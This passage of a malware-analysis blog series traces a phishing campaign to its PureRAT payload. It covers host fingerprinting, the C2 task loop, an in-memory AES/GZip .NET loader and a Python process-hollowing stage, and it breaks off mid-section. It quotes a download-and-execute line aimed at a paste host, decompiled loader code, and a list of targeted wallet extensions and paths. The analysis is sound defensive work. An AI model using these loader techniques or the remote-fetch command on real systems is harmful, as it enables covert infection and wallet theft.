ParseSubscriber() This method works as a user identity probe feeding into the host fingerprint we saw earlier. On its first run it initialises m_FactoryProgramCategory, then sets the value to the current Environment.UserName. If a domain name is available it appends Environment.UserDomainName, formatting the result as username[DOMAIN], but only if it passes a null or empty check via SendConcreteCalc().\nIn Short: ParseSubscriber() collects the logged-in username (and optionally the domain), giving the operator context about who is on the host.\nThen we meet ListenCombinedSubscriber(): This method pulls the WindowsIdentity of the running process, wraps it in a WindowsPrincipal, and checks it against a list of built-in Windows roles in descending order of importance: Administrator, User, Guest, SystemOperator, AccountOperator, BackupOperator, PowerUser, PrintOperator, and Replicator. If it finds a match, it returns the role name as a string; if none match or an error occurs, it falls back to \u0026quot;Unknown\u0026quot;.\nIn short: it reports what kind of Windows account the malware is running under, letting the C2 operator know whether they have admin privileges.\nIt then sends a hard-coded version string, \u0026quot;4.1.9\u0026quot;.\nSummary: the malware identifies itself to the C2 with a fixed version number, likely used by the operator to track builds or maintain compatibility.\nNext is ListenAutomatedSubscriber() This method queries WMI (Win32_OperatingSystem) for the Caption field, which usually returns strings such as “Microsoft Windows 10 Pro” or “Windows Server 2019 Datacenter.” It then normalises the name by checking for substrings: 7, 8, 8.1, 10, and 11 are mapped to their corresponding Windows desktop releases, while 2012, 2016, 2019, and 2022 are mapped to Windows Server editions. Finally, it appends the system architecture (32Bit or 64Bit) using Environment.Is64BitOperatingSystem.\nSummary: ListenAutomatedSubscriber() fingerprints the victim’s OS and formats it into a clean label such as “Windows 10 64Bit”, which is later reported back to the C2.\nIt gets intresting with, RemoveSelector() This method builds a profile of installed wallets and messaging apps by searching registry keys, file system paths, and browser extension IDs. It starts with a dictionary of known Chrome/Chromium extension IDs for cryptocurrency wallets, then checks common browser profile paths to see if any are present. It also scans for local storage folders and registry keys tied to desktop wallets, and even looks for non-wallet apps that are frequent credential targets such as Foxmail and Telegram Desktop.\nImportantly, this function doesn’t actually perform the theft itself it only enumerates what’s installed.\nSummary: This fingerprints the system for crypto wallets and select comms apps, returning a list like “MetaMask, Exodus, Ledger Live, Telegram”. This helps the attacker quickly identify and prioritise high-value victims.\nNext, FillSelector() This method works as an idle-time probe. It calls the Windows GetLastInputInfo API to grab the timestamp of the last keyboard or mouse event, subtracts that from the current system tick count, and formats the result into a human-readable Xd Yh Zm Ws string. If the call fails, it just returns \u0026quot;-1\u0026quot;.\nSummary: FillSelector() reports how long the machine has been idle, letting the C2 operator gauge whether the victim is actively using the system and time actions like data theft or screen capture for when the user is away.\nFinally, ListenSegmentedSubscriber() This one is straightforward it simply reports the malware’s own executable path, giving the C2 operator visibility into exactly where on disk the binary is running.\nTo make the picture clearer, I renamed the methods based on what we’ve uncovered:\nOne detail worth noting is .RestartChooser, which resolves to the value APPDATA pulled straight from the config decoded earlier.\nRecap: What ReceiveAttachedSubscriber() Does # At its core, ReceiveAttachedSubscriber() is the main client loop that establishes, maintains, and manages communication with the C2. It starts by unpacking configuration data and setting up its environment before moving into a persistent connect–retry cycle.\nConfiguration Load – The routine unpacks the embedded protobuf blob, applies execution gates, and spins up optional helper threads if flags are set. Connection Loop – After a short delay it disposes of any old sockets and repeatedly attempts to connect to the configured C2 hosts and ports. Each attempt begins with a probe, then upgrades to TLS with certificate pinning against the embedded X.509 certificate. Once a connection succeeds, the malware performs a detailed handshake, sending back a structured metadata object (ExternalFormatter) that fingerprints the victim machine:\nInstalled antivirus products A stable host ID (hardware + user/domain info, MD5’d) Webcam presence Username and domain Account privileges (Admin/User/etc.) OS version and architecture Crypto wallet and comms app reconnaissance System idle time The implant’s executable path Campaign/config tag (RestartChooser, e.g. “APPDATA”) The active C2 IP and port From there, the client keeps the session alive with a randomised 20–40 second keepalive timer while listening for tasks.\nTasking Loop – It continuously receives length-prefixed protobuf messages from the C2. Each message is deserialized and executed on a separate worker thread. Resilience – Any error or disconnect triggers a full cleanup and restarts the loop, ensuring persistence. Tasking Loop # We’ve spent most of our time unpacking the handshake and connection setup, but we haven’t dug into the task loop yet. That’s where the real functionality lives once the session is established, this loop is responsible for pulling commands from the C2 and dispatching them for execution. Let’s focus on that in the next portion.\nThe task loop is fairly straightforward once unpacked:\n(Red) Read the first 4 bytes to determine the payload length. (Blue) Read that many bytes into a buffer — this is the actual payload. (Green) Deserialize the buffer with the protobuf routine we saw earlier: PassiveFormatter.FormatConcreteFormatter(...). (Green) Spawn a new thread and call DecideFlexibleController() on the message to execute the task. It’s pretty clear this is a command-and-control loop, structured, threaded, and designed to process arbitrary instructions from the operator.\nYou might remember the earlier references to PureHVNC. Jumping into the assembly explorer, we can see several namespaces tied to PureHVNC components, strong evidence that this sample is tied to Pure Hidden VNC.\nWhile PureHVNC is now considered legacy, many of its modules live on in PureCoder’s newer malware families, each designed to serve a specific purpose:\nPureCrypter – a crypter used to inject malware into legitimate processes, evade detection, and frustrate analysis with anti-VM and anti-debug checks. PureMiner – a silent cryptojacker that hijacks the victim’s CPU and GPU resources to mine cryptocurrency for the attacker without consent. PureLogs Stealer – an information stealer that exfiltrates browser data, saved credentials, and session tokens, often delivering them directly to the attacker’s Telegram. BlueLoader – a loader that deploys additional payloads on infected systems, giving attackers an easy way to stage and update malware campaigns. PureRAT – a modular backdoor that establishes an encrypted C2 channel, and allows operators to load additional modules PureRAT # This sample appears to be PureRAT, a backdoor designed to let attackers load in different malicious modules.\nThe developer openly advertised this tool as a custom-coded .NET remote administration tool, with a lightweight, TLS/SSL-encrypted client and multilingual GUI, offering extensive surveillance and control features such as hidden desktop access (HVNC/HRDP), webcam and microphone spying, real-time and offline keylogging, remote CMD, and application monitoring (e.g., browsers, Outlook, Telegram, Steam). It includes management tools like file, process, registry, network, and startup managers, plus capabilities for DDoS attacks, reverse proxying, .NET code injection, streaming bot management, and execution of files in memory or disk. Though it notably \u0026ldquo;excludes password/cookie recovery\u0026rdquo; (Stealer Functionality) as that is sold separately.\nAs we have discovered in our analysis, once installed, it establishes an SSL-encrypted C2 channel and begins exfiltrating host details.\nAfter initial reconnaissance, it enters a task loop where the operator can push new modules on demand, dynamically expanding the malware’s capabilities for surveillance, and remote control.\nUnfortunately, my analysis ends here, as I was unable to obtain any samples of the threat actors’ plugins.\nClosing Thoughts: From Fake PDFs to PureRAT # Across nine stages, this campaign evolved from humble beginnings into a fully weaponised, modular ecosystem. Each stage peeled back another layer of the attacker’s tradecraft, and together they paint a clear picture of a determined and technically adept adversary.\nStage 1–2 (Part 1) – The operation began with a phishing lure disguised as a copyright notice. Through DLL sideloading, BYOB (WinRAR), and LOLBIN abuse (certutil), the actor achieved stealthy initial execution. These stages showed early reliance on trusted binaries and simple obfuscation to quietly establish a foothold.\nStage 3–4 (Part 2) – Obfuscated Python scripts evolved into Base85-encoded bytecode and marshalled payloads, executed entirely in memory. These stages revealed the actor’s custom cryptographic loaders, multi-layered obfuscation, and heavy use of dynamic execution to frustrate static analysis.\nStage 5 (Part 3) – The first weaponised payload appeared: a Python-based infostealer. It targeted Chrome/Firefox data, enumerated AV via WMI, and exfiltrated archives to Telegram channels tied to the handle @LoneNone. This stage cemented attribution links to PXA Stealer while hinting at a Vietnamese operator.\nStage 6–7 (Part 4) – A turning point. The actor pivoted from Python to compiled Windows executables. Using hybrid cryptography (RC4 + Base64), process hollowing (RegAsm.exe), and in-memory shellcode injection, they delivered a packed .NET loader (Stage 7). This loader featured AMSI patching, ETW unhooking, and modular reflection-based loading, showing some serious runtime evasion.\nStage 8 (Part 5) – The complexity escalated with AES-encrypted payloads, GZip compression, and .NET reflection loaders. Payloads were hidden in memory-only byte arrays, decrypted at runtime, and executed without exports or disk artifacts. Dynamic memory dumping revealed Mhgljosy.dll, protected with .NET Reactor, confirming the use of commercial protections to frustrate analysts.\nStage 9 (Part 6) – At last, the final payload emerged: PureRAT. With TLS C2 communications, protobuf-based configs, fingerprinting of AV, OS, users, crypto wallets, and privilege levels, it transformed into a flexible RAT with modular plugin support. Links to the PureCoder ecosystem (PureRAT, PureHVNC, PureCrypter, PureLogs, BlueLoader, etc.) demonstrate that the campaign was not a one-off but part of a broader, evolving threat actor going from their own payloads to off-the-shelf RAT\u0026rsquo;s.\nThe Actors Behind the Curtain # The recurring Telegram infrastructure, metadata linking to @LoneNone, and C2 servers traced to Vietnam strongly suggest a Vietnamese threat actor. Their progression from amateurish obfuscation to abusing professional-grade tools like .NET Reactor shows not just persistence, but also access to commercial malware tooling hallmarks of a serious and maturing operator.\nMalware Families \u0026amp; Ecosystem # Custom Python Loaders (Stage 2–4) – staged bytecode, cryptographic loaders PXA Stealer (Stage 5) – early infostealer variant .NET Loaders (Stage 6–8) – modular reflection-based loaders. PureRAT (Stage 9) – final payload, a full-featured backdoor tied to the PureCoder ecosystem Conclusion # What began as a fake PDF quickly escalated into a multi-language, multi-stage, and multi-family operation that chained together Python, .NET, and commercial RAT tooling. The campaign demonstrates a clear trajectory:\nStealthy entry → Layered loaders → Credential theft → Runtime evasion → Full-featured RAT. From opportunistic phishing to a professional PureRAT deployment, this campaign reflects not only the creativity of its operator, but also the shifting threat landscape, where commodity malware families, custom loaders, and C2 ecosystems converge into a single, resilient attack chain.\nAnnex A: Software and Artefacts Enumerated by RemoveSelector() # A) Browser-based wallets and auth extensions (by Chrome/Chromium extension ID) - ibnejdfjmmkpcnlpebklmnkoeoihofec → TronLink - nkbihfbeogaeaoehlefnkodbefgpgknn → MetaMask - fhbohimaelbohpjbbldcngcnapndodjp → Binance Chain Wallet - ffnbelfdoeiohenkjibnmadjiehjhajb → Yoroi - cjelfplplebdjjenllpjcblmjkfcffne → Jaxx Liberty - fihkakfobkmkjojpchpfgcmhfjnmnfpi → BitApp Wallet - kncchdigobghenbbaddojjnnaogfppfj → iWallet - aiifbnbfobpmeekipheeijimdpnlpgpp → Terra Station - ijmpgkjfkbfhoebgogflfebnmejmfbml → BitClip - blnieiiffboillknjnepogjhkgnoapac → EQUAL Wallet - amkmjjmmflddogmhpjloimipbofnfjih → Wombat - jbdaocneiiinmjbjlgalhcelgbejmnid → Nifty Wallet - afbcbjpbpfadlkmhmclhkeeodmamcflc → Math Wallet - hpglfhgfnhbgpjdenjgmdgoeiappafln → Guarda - aeachknmefphepccionboohckonoeemg → Coin98 Wallet - imloifkgjagghnncjkhggdhalmcnfklk → Trezor Password Manager - oeljdldpnmdbchonielidgobddffflal → EOS Authenticator - gaedmjdfmmahhbjefcbgaolhhanlaolb → Authy - ilgcnhelpchnceeipipijaljkblbcobl → GAuth Authenticator - bhghoamapcdpbohphigoooaddinpkbai → Authenticator - mnfifefkajgofkcjkemidiaecocnkjeh → TezBox - dkdedlpgdmmkkfjabffeganieamfklkm → Cyano Wallet - aholpfdialjgjfhomihkjbmgjidlcdno → Exodus Web3 - jiidiaalihmmhddjgbnbgdfflelocpak → BitKeep - hnfanknocfeofbddgcijnmhnfnkdnaad → Coinbase Wallet - egjidjbpglichdcondbcbdnbeeppgdph → Trust Wallet - hmeobnfnfcmdkdcmlblgagmfpfboieaf → XDEFI Wallet - bfnaelmomeimhlpmgjnjophhpkkoljpa → Phantom - fcckkdbjnoikooededlapcalpionmalo → MOBOX WALLET - bocpokimicclpaiekenaeelehdjllofo → XDCPay - flpiciilemghbmfalicajoolhkkenfel → ICONex - hfljlochmlccoobkbcgpmkpjagogcgpk → Solana Wallet - cmndjbecilbocjfkibfbifhngkdmjgog → Swash - cjmkndjhnagcfbpiemnkdpomccnjblmj → Finnie - dmkamcknogkgcdfhhbddcghachkejeap → Keplr - kpfopkelmapcoipemfendmdcghnegimn → Liquality Wallet - hgmoaheomcjnaheggkfafnjilfcefbmo → Rabet - fnjhmkhhmkbjkkabndcnnogagogbneec → Ronin Wallet - klnaejjgbibmhlephnhpmaofohgkpgkd → ZilPay - ejbalbakoplchlghecdalmeeeajnimhm → MetaMask (alt ID) - ghocjofkdpicneaokfekohclmkfmepbp → Exodus Web3 (alt ID) - heaomjafhiehddpnmncmhhpjaloainkn → Trust Wallet (alt ID) - hkkpjehhcnhgefhbdcgfkeegglpjchdc → Braavos Smart Wallet - akoiaibnepcedcplijmiamnaigbepmcb → Yoroi (alt ID) - djclckkglechooblngghdinmeemkbgci → MetaMask (alt ID) - acdamagkdfmpkclpoglgnbddngblgibo → Guarda Wallet - okejhknhopdbemmfefjglkdfdhpfmflg → BitKeep (alt ID) - mijjdbgpgbflkaooedaemnlciddmamai → Waves Keeper B) Browser profile roots checked (where it searches for those extensions) - Chromium\\User Data\\ → Chromium - Google\\Chrome\\User Data\\ and Google(x86)\\Chrome\\User Data\\ → Chrome - BraveSoftware\\Brave-Browser\\User Data\\ → Brave - Microsoft\\Edge\\User Data\\ → Edge - Tencent\\QQBrowser\\User Data\\ → QQBrowser - MapleStudio\\ChromePlus\\User Data\\ → ChromePlus - Iridium\\User Data\\ → Iridium - 7Star\\7Star\\User Data\\ → 7Star - CentBrowser\\User Data\\ → CentBrowser - Chedot\\User Data\\ → Chedot - Vivaldi\\User Data\\ → Vivaldi - Kometa\\User Data\\ → Kometa - Elements Browser\\User Data\\ → Elements - Epic Privacy Browser\\User Data\\ → Epic Privacy - uCozMedia\\Uran\\User Data\\ and Uran\\User Data\\ → Uran - Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\ → Sleipnir5 - CatalinaGroup\\Citrio\\User Data\\ → Citrio - Coowon\\Coowon\\User Data\\ → Coowon - liebao\\User Data\\ → liebao - QIP Surf\\User Data\\ → QIP Surf - Orbitum\\User Data\\ → Orbitum - Comodo\\Dragon\\User Data\\ → Dragon - Amigo\\User\\User Data\\ → Amigo - Torch\\User Data\\ → Torch - Comodo\\User Data\\ → Comodo - 360Browser\\Browser\\User Data\\ → 360Browser - Maxthon3\\User Data\\ → Maxthon - K-Melon\\User Data\\ → K-Melon - Sputnik\\Sputnik\\User Data\\ → Sputnik - Nichrome\\User Data\\ → Nichrome - CocCoc\\Browser\\User Data\\ → CocCoc - Chromodo\\User Data\\ → Chromodo - Mail.Ru\\Atom\\User Data\\ → Atom C) Desktop wallets and related apps (filesystem checks under %APPDATA%) - atomic\\Local Storage\\leveldb → Atomic Wallet - Electrum\\wallets → Electrum - Ethereum\\keystore → Ethereum (keystore) - Exodus\\exodus.wallet → Exodus - com.liberty.jaxx\\IndexedDB → Jaxx - Zcash\\ → Zcash - Telegram Desktop\\Telegram.exe → Telegram Desktop - Root of system drive contains a directory named “Foxmail” → Foxmail D) Desktop wallets (registry → path lookup) - HKCU\\Software\\Bitcoin\\Bitcoin-Qt → read `strDataDir`, then check ...\\wallets exists → Bitcoin-Qt - HKCU\\Software\\Dash\\Dash-Qt → read `strDataDir`, then check the directory exists → Dash-Qt - HKCU\\Software\\Litecoin\\Litecoin-Qt → read `strDataDir`, then check the directory exists → Litecoin-Qt E) Program Files (x64) check - %ProgramFiles%\\Ledger Live\\Ledger Live.exe → Ledger Live ","date":"3 September 2025","externalUrl":null,"permalink":"/posts/python_malware_part6/","section":"Blog","summary":"After nine stages of obfuscation, the final payload reveals itself as PureRAT, a commercial .NET RAT using TLS-pinned C2, Protocol Buffers, and modular plugins for remote access and control.","title":"PXA Stealers Evolution to PureRAT: Part 6 - Finally, the Final Stage PureRAT (Stage 9)","type":"posts"},{"content":" Introduction # In the last stage of our analysis we uncovered yet another layer in this malware’s multi-stage loading process. By this point, the pattern is clear: each step we peel back only serves to reveal a new mechanism designed to frustrate static inspection. Now, as we enter the eighth stage, we find ourselves facing a loader that takes full advantage of .NET’s flexibility.\nUnlike the earlier layers that relied on simple obfuscation and resource embedding, this stage demonstrates a more advanced approach dynamically loading assemblies directly from memory, decrypting them on the fly, and invoking methods without ever touching disk. This significantly raises the bar for detection and complicates traditional static analysis.\nWhat follows is a closer look at this executable, its obfuscation techniques, and how we pivoted from static reverse engineering into a more dynamic approach to uncover its hidden payloads.\nIn the previous part we extracted an executable from another executable hidden through Base64 encoding and XOR obfuscation and now, looking at that in more detail, we arrive at the 8th stage.\nSHA256: 06FC70AA08756A752546198CEB9770068A2776C5B898E5FF24AF9ED4A823FD9D Original filename: maegkffm.exe Detection: No hits on VirusTotal — appears to be previously unknown. Running FLOSS against the binary yields a variety of strings pointing to encryption routines and injection functionality. Unlike previous stages, however, there are no immediate plaintext artefacts or “quick wins” to accelerate analysis. This suggests the malware authors have deliberately shifted to stronger concealment techniques at this point in the chain, forcing us to pivot towards deeper static and dynamic examination.\nAs this stage is a .NET executable, we can load it into dnSpy to take a closer look. Right-clicking on the assembly and selecting Go to Entry Point drops us into the method defined under: public static class \\u0008\\u2009\nClicking on \\u0006\\u2009 lets us follow the control flow and inspect its code.\nThis appears to be the loader. Stepping through it, we can unpack each call:\nLoad Bytes from Obfuscated Source\nbyte[] array = \\u000E\\u2009.\\u0003(); Calls a method \\u0003() on the class \\u000E\\u2009 (both obfuscated). It returns a byte[], presumably representing a compiled .NET assembly. Validate the Byte Array\nif (array == null || array.Length == 0) { throw new InvalidOperationException(); } Defensive check: ensures the byte array isn\u0026rsquo;t null or empty. Load the Assembly from Memory\nAssembly assembly = Assembly.Load(array); Dynamically loads the byte array as a .NET assembly in memory. Nothing is written to disk makes it harder to detect or analyse statically. Get a Type from the Assembly # Type type = assembly.GetType(\\u0003\\u0019.\\u0003(1682298672)); \\u0003\\u0019.\\u0003(1682298672) is likely a a string resolver or decryptor. It\u0026rsquo;s used to get the full name of a type in the loaded assembly. Get a Method from That Type # MethodInfo method = type.GetMethod(\\u0003\\u0019.\\u0003(1682298624), Type.EmptyTypes); Again uses the string resolver to get the method name. Call the Method via Delegate # ((Action)Delegate.CreateDelegate(typeof(Action), method))(); Wraps the target method in an Action delegate and invokes it. Functionally equivalent to calling the method, but adds another layer of indirection to hinder straightforward decompilation and string matching. Lets follow byte[] array = \\u000E\\u2009.\\u0003(); to see if we can find the assembly.\nAt a high level, the data\u0026rsquo;s path is: embedded_bytes → AES decrypt → GZip inflate → managed Assembly.Load()\nBreaking it down:\nLoad Bytes # private static byte[] \u0006() This method returns an encrypted, compressed byte array.\nContains a hardcoded byte[] literal that represents the embedded payload: return new byte[] { 63, 207, 118, 142, 197, 124, 32, ... }; Decrypt Bytes # private static byte[] \u0003(byte[] encrypted) This method decrypts the byte array returned from \u0006() using AES-256 in CBC mode.\nUses Aes.Create() with:\naes.KeySize = 256;\naes.Key = Convert.FromBase64String(...)\naes.IV = Convert.FromBase64String(...)\nThese values are dynamically retrieved from an obfuscated string resolver:\n\\u0003\\u0019.\\u0003(1682298750) // Base64-encoded AES key \\u0003\\u0019.\\u0003(1682298697) // Base64-encoded IV Sets up a decryption stream: CryptoStream cryptoStream = new CryptoStream( new MemoryStream(encrypted), aes.CreateDecryptor(aes.Key, aes.IV), CryptoStreamMode.Read ); cryptoStream.CopyTo(outputStream); Returns the decrypted result as a byte[] which is still GZip-compressed. Inflate Bytes # private static byte[] \u0006(byte[] compressed) This method decompresses the GZip-compressed byte array returned from the decryption step.\nUses GZipStream to decompress the input: GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress); gzipStream.CopyTo(memoryStream2); Returns the fully decrypted and decompressed byte array, ready to be loading into memory by the previous method. We have the data and the encryption routine now we just need the key and IV, clicking on \\u0003\\u0019.\\u0003 to follow it we see how the keys are generated.\nThe AES key and IV are generated and deobfuscated at runtime. It is buried under layers of junk logic and opaque helper calls, which makes static inspection tedious and low value. That section alone spans ~668 lines, and most of it appears to exist purely to waste analysis time by constructing variables and branches that are never used.\nAt this point, continuing statically would be a poor use of my time. We will pivot to dynamic analysis. Since this stage behaves like a packer or loader, the fastest path forward is to let it run, then dump the decrypted, decompressed payload from memory after the loader has done the hard work for us.\nWhy Static? # I prefer to stick with static analysis for as long as possible. It gives me a deeper understanding of how the malware operates and more importantly, how the threat actor thinks and writes. This approach helps uncover what capabilities we might expect to see, and if we’re lucky, we might even catch mistakes the threat actor made, things we could easily miss with dynamic analysis alone.\nBut in this case, the time cost isn’t worth the insight. It’s time to move forward.\nDynamic Analysis # The typical approach here would be to run the malware inside a debugger and set a breakpoint right after it loads the payload into memory, but before it invokes or executes it. That way, you can catch the decrypted, unpacked binary at rest and dump it cleanly.\nHowever, we\u0026rsquo;re going to cheat a little and use ExtremeDumper, a tool purpose-built to make memory dumping from .NET binaries much easier. It saves us a lot of time and lets us focus on analysing the payload, not reinventing the wheel.\nRunning both maegkffm.exe and ExtremeDumper.exeas administrator we see the option to dump selected process.\nThe output of ExtremeDumper shows it found something Hashing the dump set shows the .exe matches our original sample, so we can ignore it. The interesting part is Mhgljosy.dll appearing twice with different hashes.\nTo understand why the two DLLs differ, I loaded both into HxD and used the built-in comparison feature:\nAnalysis → Data comparison → Compare (or simply hit Ctrl + K).\nWhen comparing the two files in HxD, we notice that differences start appearing around offset 0x000A0000. Interestingly, the file on the left appears to be malformed, we can see the magic bytes and DOS stub message (e.g. \u0026ldquo;This program cannot be run in DOS mode\u0026rdquo;) showing up partway through the file, rather than at the beginning as expected in a valid PE (Portable Executable) format.\nThis strongly suggests that the left file is either partially overwritten, misaligned, or was not dumped correctly.\nFor the purposes of this analysis, we’ll proceed with the file on the right, as it appears to be the more structurally valid of the two.\nFIle Name: Mhgljosy.dll SHA265: e0e724c40dd350c67f9840d29fdb54282f1b24471c5d6abb1dca3584d8bac0aa Detection: No hits on VirusTotal — appears to be previously unknown.\nRunning FLOSS doesn’t yield much in the way of useful strings, which immediately hints at obfuscation or packing.\nConfirming this, Detect It Easy (DiE) flags the DLL as being protected by .NET Reactor a commercial protector commonly abused by malware authors to frustrate analysis. .NET Reactor typically.\nPivoting from EXE to DLL # At this point in the analysis, we’re shifting focus from a traditional PE executable (.exe) to a DLL (.dll). While both share the same underlying PE (Portable Executable) format, analysing a DLL introduces a few key differences:\nNo standard entry point — instead, execution typically begins via exported functions, or sometimes when the DLL is loaded (e.g. DllMain). More context-dependent — DLLs are often designed to be loaded by a specific application or loader. As a result, some functionality may not initialise properly in isolation. May behave passively — if not invoked correctly, a DLL may appear inert during static or dynamic analysis. Because of this, we’ll need to adjust our approach, focusing on exported functions, examining DllMain, and possibly simulating or reconstructing the loading environment to trigger the behaviour we\u0026rsquo;re trying to observe.\nBut interestingly, when we inspect the sample in PEStudio, we see that it has no exported functions: Commonly, malware leverages an exported function (e.g. RunPayload) that gets explicitly called by the loader or dropper. However, this sample is doing something different.\nBefore diving deeper, let’s quickly confirm that this is in fact a DLL using CFF Explorer it wouldn’t be the first time a misleading file extension was used to confuse an analyst.\nEverything checks out, this is a legitimate DLL. So what’s going on?\nEven when a DLL exposes no exports, it still has a built-in entry point: DllMain(). While not a typical function you would call directly, the Windows loader automatically executes it, and threat actors can exploit this behaviour.\nDLL Entry Point: DllMain() # A DLL doesn’t have a traditional entry point like an executable’s. Instead, it provides an entry routine usually DllMain() that the Windows loader automatically triggers during key lifecycle events:\nWhen the DLL is loaded (DLL_PROCESS_ATTACH) When a thread is created (DLL_THREAD_ATTACH) When a thread ends (DLL_THREAD_DETACH) When the DLL is unloaded (DLL_PROCESS_DETACH) This design means code can still run automatically as soon as the DLL is loaded, even without exports. Malware authors can abuse this by embedding payloads inside the DLL_PROCESS_ATTACH case, ensuring execution without needing a visible entry point like a standard executable.\n.NET DLLs are weird. # Although that’s not the case here either, as this is a .NET DLL, so the traditional DllMain() behaviour doesn’t apply. In .NET assemblies, the .NET runtime handles the loading, and the actual execution flow usually starts elsewhere.\nSince this sample is .NET-based, let’s load it into dnSpy. Normally with .NET executables, we can jump straight to the Main() method or an obvious export. But here, we’re dealing with a DLL that has:\nNo exports No Main method No clear entry point So where’s the execution logic hiding?\nGoing Back to the Loader # Let’s pause and retrace our steps. Looking back at the loader, remember in \\u0006\\u2009 where it appeared to decrypt or decode a method at runtime, then invoke it through a delegate? I think that might be our method it was sitting there the whole time, but we got sidetracked going down the path of traditional dll analysis.\nWhy does this work? **.NET assemblies are a Special case:\nIn our sample, both the EXE and the DLL are .NET assemblies, so things are a little different. The loader (Assembly.Load(bytes)) pulls a DLL into memory directly. Instead of needing exports, the EXE asks the .NET runtime for a Type and MethodInfo, then uses reflection (GetMethod, Delegate.CreateDelegate) to invoke it. This means the DLL doesn’t even need to have “traditional” exports like DllMain or ExportedFunction. As long as the .NET runtime can find the class and method, it can be executed. This is exactly why static analysis matters: if we had only dumped this DLL from memory, we’d have the payload but no real context for where or how it was invoked. Our earlier Static work gives us that insight.\nWith that in mind, let’s pivot back to the loader executable and try a feature of dnSpy we haven’t used yet. Since both the type and method are only revealed at runtime, we can take advantage of dnSpy’s debugging capabilities to observe this process directly. To start, we’ll set a breakpoint right at the program’s entry point, then run it.\nNext, we can track down the delegate we identified earlier and set an additional breakpoint there. Running the program up to that point reveals the local variable being assigned to the method:\nMhgljosy.Formatting.TransferableFormatter.SelectFormatter()\nThis confirms that the loader is dynamically resolving and invoking this function at runtime.\nBack in the DLL, searching for SelectFormatter quickly brings us to its definition, where we can start breaking down its behaviour.\nAlthough after stepping through various methods and functions, it’s clear we won’t get much further — the code is heavily obfuscated by .NET Reactor, as noted earlier. With that, I’m going to wrap up this part, but first, a quick recap.\nRecap Time: What Did We Find in Stage 8 and 9 # What began as yet another obfuscated executable peeled back into a secondary .NET loader, one crafted not just to frustrate the analyst, but to deliberately shift analysis towards an unusual execution of DLLs.\nThis stage introduced:\nA memory-only execution chain:\nAES-256 decryption → GZip inflation → Assembly.Load() Hardcoded payload hidden in a byte array, never touching disk Dynamic string resolution for runtime-only type names, method names, and AES key/IV values, all buried beneath hundreds of lines of junk logic Reflection-based invocation via delegates, bypassing traditional DLL export functions Dumped payload (Mhgljosy.dll) protected by .NET Reactor. Each layer was carefully crafted to ensure the payload remained invisible to static tools like VirusTotal, FLOSS, or simple string scans, while forcing analysts to pivot into dynamic techniques such as in-memory dumping and debugger-assisted tracing.\nThis approach:\nRaises the bar for detection and reverse engineering Shows deliberate use of commercial protections in a malicious context Suggests a modular, evolving loader–DLL architecture, where each stage acts as a gatekeeper for the next. Up Next: Part 6 — Deep Dive into Mhgljosy.dll # We’ve reached the next stage and spoiler alert, it’s the final one. With dynamic tracing, we’ve pinned down the true entry point:\nMhgljosy.Formatting.TransferableFormatter.SelectFormatter()\nSo join me in Part 6 as I take on the challenge of deobfuscating .NET Reactor and finally uncover what this payload is really designed to do.\n","date":"2 September 2025","externalUrl":null,"permalink":"/posts/python_malware_part5/","section":"Blog","summary":"Advanced .NET loader dynamically loads assemblies from memory, decrypts payloads on-the-fly, and invokes methods without touching disk, requiring a pivot from static to dynamic analysis techniques.","title":"PXA Stealers Evolution to PureRAT: Part 5 - Another Shift in Tactics (Stage 8)","type":"posts"},{"content":" Introduction # Stage 6 marks a major turning point in the campaign: a shift from Python bytecode to compiled Windows executables. What begins with a familiar exec(requests.get().text) call quickly escalates into in-memory PE injection, using well-known techniques like process hollowing to silently execute a malicious binary.\nIn this section, we analyse the first .NET-based payload in the chain. We\u0026rsquo;ll walk through how the malware decrypts and injects its components, unpacks additional stages on the fly, and leverages runtime evasion tactics like AMSI patching and ETW unhooking, signalling a move toward a far more modular and persistent threat architecture.\nStage 6 # We left off with an in-memory execution of Stage 6 via a the pattern:\nexec(requests.get(https://0x0[.]st/8WBr.py).text)\nBut this time, our usual tricks wouldn’t cut it.\nUnlike earlier stages, attempting to disassemble this payload using Python’s dis module completely failed, I suspect the script was too large or complex. Instead, we opt to dump the payload directly to a .pyc (compiled Python) file for further inspection. And the first thing I noticed? The size.\nSize matters:\nStage 5 .pyc: ~40 KB Stage 6 .pyc: 2917 KB This alone suggested we were in for something significantly more advanced then the previous InfoStealer.\nRunning strings over the .pyc helped surface some immediate indicators of reuse. Familiar terms like hybrid_decrypt, rsa_private_key, xor_key, and encrypted_data all reappeared, strongly implying that the same decryption routines from earlier stages were being reused, albeit at a much larger scale.\nThis strongly suggests that it’s once again using the same hybrid_decrypt module seen in earlier stages. Since disassembly failed, we instead had to extract the ciphertext and key manually from the raw hex, and the previous stage became instrumental in guiding this process.\nBy comparing Stage 5 and Stage 6 side by side, we can identify where the key and ciphertext begin and end within the hex dump. For example, in Stage 5 we know the ciphertext ends with the ASCII sequence X*d, looking at the Hex the sequence just after this ascii is 29 34 DA. Searching for this in the Stage 6 binary helps us locate a matching structure.\nRevealing the Stage 6 ciphertext ends with 64 4D 57 or dMW in ASCII. Repeating this process for both the key and ciphertext boundaries, we successfully carved out the necessary segments.\nWith these values extracted, we passed them into the hybrid_decrypt function and successfully obtained the disassembled output of the next stage. Due to the legth we\u0026rsquo;ll pipe it to a text file and open is VSCode\nKey Imports and Their Functions\nOnce again, I\u0026rsquo;ve gone through and identified the key imports to understand what this stage of the malware is designed to do.\nSystem and Platform Inspection # platform – Used to determine system architecture (e.g., 64-bit vs 32-bit). sys – Provides access to system-specific parameters and functions, such as sys.exit(). os – Used for file system interactions and environment variable access. Windows API and Low-Level Memory Access # ctypes – Enables direct interaction with Windows APIs and memory management functions. ctypes.wintypes – Provides common Windows data types for use with ctypes. windll – Used to load and interact with system DLLs, including: kernel32 – Commonly used for functions like CreateProcessA, VirtualAllocEx, WriteProcessMemory, etc. ntdll – Provides lower-level functionality like NtWriteVirtualMemory, NtUnmapViewOfSection, and other native Windows routines. Payload Handling # pefile – A third-party library used to parse and inspect PE (Portable Executable) files, often for manual loading or manipulation in memory. base64 – Handles encoding and decoding operations, typically used for obfuscated or embedded payloads. rc4 – Custom RC4 routine for decrypting payloads. Process Execution # subprocess – Allows execution of external processes or commands, such as launching RegASM.exe or killing other processes using taskkill. From analysing these imports we can create the following hypothesis:\nDecrypt embedded payloads, which are base64-encoded and RC4-encrypted. Inject and execute payloads in memory using low-level Windows APIs. Analysing the Bytecode # Upon inspection, stage 6 appears to execute two payloads sequentially. For ease of understanding, the relevant logic has been reimplemented in Python.\nChain 1 — PE Injection via Process Hollowing # # Step 